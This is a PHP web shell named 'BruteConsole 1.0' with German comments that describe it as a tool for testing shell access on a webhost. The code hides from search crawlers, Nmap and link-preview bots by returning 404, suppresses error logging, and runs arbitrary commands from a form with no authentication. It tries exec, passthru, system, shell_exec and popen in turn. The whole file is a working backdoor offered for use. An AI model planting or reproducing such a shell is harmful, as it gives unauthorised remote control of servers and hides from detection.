<?php
/*
Veröffentlich von @armando_thiemt.
Kann auch generell genutzt werden, um einen Webhost auf Sicherheit in Bezug auf Shellzugriff zu testen.
Bitte nicht für illegale Zwecke (aus)nutzen!
*/
if(!empty($_SERVER['HTTP_USER_AGENT']) ) {
    $userAgents = array("Google", "Slurp", "MSNBot", "Nmap", "Baidu", "bot", "Bot", "yandex", "WEBDAV", "ia_archiver", "Yandex", "Rambler", "Bing", "Yahoo", "Twitter", "Skype", "Whatsapp", "WhatsApp", "Telegram");
    foreach($userAgents as $agent)
        if( strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false ) {
            header('HTTP/1.0 404 Not Found');
            exit;
        }
}else{
	header('HTTP/1.0 404 Not Found');
	exit;
}
if(strtolower(substr(PHP_OS,0,3)) == "win" )
	$os = 'Windows';
else
	$os = 'Linux,FreeBSD etc.';

@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
?>
<!DOCTYPE html>
<html>
<head>
	<title>BruteConsole 1.0</title>
	<meta name="author" content="armando thiemt">
	<style>
.bigarea{ width:100%;height:550px; }
</style>
</head>
<body>
<?php
echo '<p>Betriebssystem:
'.$os.'</p>
<form method="post" action="'.$_SERVER['PHP_SELF'].'">';
?>
	<input type="text" placeholder="Befehl" name="cmd">
	<input type="submit" value="Ausf&uuml;hren">
</form>
<?php
if(isset($_POST['cmd'])){
$out = brute_console($_POST['cmd']);
echo '<textarea class="bigarea" style="border-bottom:0;margin:0;" readonly="">';
echo $_POST['cmd']."\r\n_______\r\n";
print $out;
echo '</textarea>';
}
?>
</body>
</html>
<?php
function brute_console($command) {
	$out = 'Es wurde kein Shellzugriff gefunden!';
	if(function_exists('exec')) {
		@exec($command,$out);
		$out = @join("\n",$out);
		$func = "[ exec ]";
	}elseif(function_exists('passthru')) {
		ob_start();
		@passthru($command);
		$out = ob_get_clean();
		$func = "[ passthru ]";
	}elseif(function_exists('system')) {
		ob_start();
		@system($command);
		$out = ob_get_clean();
		$func = "[ system ]";
	}elseif(function_exists('shell_exec')) {
		$out = shell_exec($command);
		$func = "[ shell_exec ]";
	}elseif(is_resource($f = @popen($command,"r"))) {
		$out = "";
		$func = "[ fread ]";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return "\r Funktion: ".$func." \r_______\r\n\r\n".$out;
}
?>
